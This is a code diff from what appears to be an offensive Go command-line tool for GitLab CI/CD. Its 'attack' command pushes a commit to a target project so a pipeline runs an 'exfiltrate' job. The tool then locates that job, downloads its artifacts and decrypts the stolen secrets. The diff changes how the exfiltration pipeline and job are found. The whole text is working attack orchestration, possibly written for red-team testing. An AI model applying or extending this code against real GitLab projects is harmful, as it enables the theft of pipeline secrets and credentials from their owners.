@@ -182,7 +182,7 @@ type attackRunner interface {
 }
 
 type secretsRunner interface {
-	RunExfil(ctx context.Context, projectID any, branch, pubkey string, runnerTags []string, exfil attack.ExfilOptions) (string, error)
+	RunExfil(ctx context.Context, projectID any, branch, pubkey string, runnerTags []string, exfil attack.ExfilOptions) (url, jobName string, err error)
 }
 
 var newAttacker = func(gl *gitlabx.Client, baseURL, authorName, authorEmail string, timeout time.Duration) attackRunner {
@@ -1206,20 +1206,11 @@ var attackCmd = &cobra.Command{
 			}
 			sr := newSecretsRunner(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
 			exfil := attack.ExfilOptions{Method: atkExfilMethod, Target: atkExfilTarget}
-			// Capture the latest pipeline ID before committing so WaitForPipelineForRef
-			// returns only the NEW pipeline triggered by the exfil commit, not one created
-			// by EnsureBranch (which pushes the branch from main and triggers its own pipeline).
-			priorPipelineID, _ := attack.WaitForPipelineForRef(ctx, client, atkTarget, atkBranch, 0, 100*time.Millisecond, 2*time.Second)
-			url, err := sr.RunExfil(ctx, atkTarget, atkBranch, pubkey, tags, exfil)
+			url, exfilJobNameUsed, err := sr.RunExfil(ctx, atkTarget, atkBranch, pubkey, tags, exfil)
 			if err != nil {
 				return err
 			}
-			// Resolve actual pipeline ID for a better URL — require ID > priorPipelineID
-			// so we don't pick up the branch-creation pipeline.
-			pipelineID, waitErr := attack.WaitForPipelineForRef(ctx, client, atkTarget, atkBranch, priorPipelineID, 2*time.Second, 45*time.Second)
-			if waitErr == nil && pipelineID > 0 {
-				url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(gitlabURL, "/"), atkTarget, pipelineID)
-			}
+			// Give GitLab a moment to process the commit before querying pipelines.
 			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", url)
 
 			// Wait for the exfiltrate job, download artifacts, and decrypt — default for artifact method.
@@ -1227,9 +1218,10 @@ var attackCmd = &cobra.Command{
 				exfilSecrets map[string]string
 				exfilJobID   int64
 				exfilStatus  string
+				pipelineID   int64
 			)
 			exfilMethod := strings.ToLower(strings.TrimSpace(atkExfilMethod))
-			if !atkNoWait && pipelineID > 0 && (exfilMethod == "" || exfilMethod == "artifact") {
+			if !atkNoWait && (exfilMethod == "" || exfilMethod == "artifact") {
 				// In JSON mode write progress to stderr so stdout stays clean JSON.
 				progressW := cmd.OutOrStdout()
 				if outputJSON {
@@ -1237,7 +1229,13 @@ var attackCmd = &cobra.Command{
 				}
 				stdout := progressW
 				renderInfo(stdout, fmt.Sprintf("waiting for exfiltrate job (timeout: %s)...", atkWaitTimeout))
-				exfilJobID, exfilStatus, _ = attack.WaitForJobCompletion(ctx, client, atkTarget, pipelineID, "exfiltrate", 5*time.Second, atkWaitTimeout)
+				// WaitForExfilPipeline scans the 5 most recent pipelines on the branch each tick,
+				// so it correctly finds the exfil pipeline even when the branch-creation pipeline
+				// (triggered by EnsureBranch) appears first and contains no "exfiltrate" job.
+				pipelineID, exfilJobID, exfilStatus, _ = attack.WaitForExfilPipeline(ctx, client, atkTarget, atkBranch, exfilJobNameUsed, 5*time.Second, atkWaitTimeout)
+				if pipelineID > 0 {
+					url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(gitlabURL, "/"), atkTarget, pipelineID)
+				}
 				switch exfilStatus {
 				case "success":
 					zipBytes, zerr := secdump.DownloadJobArtifactsZIP(ctx, client, atkTarget, exfilJobID)
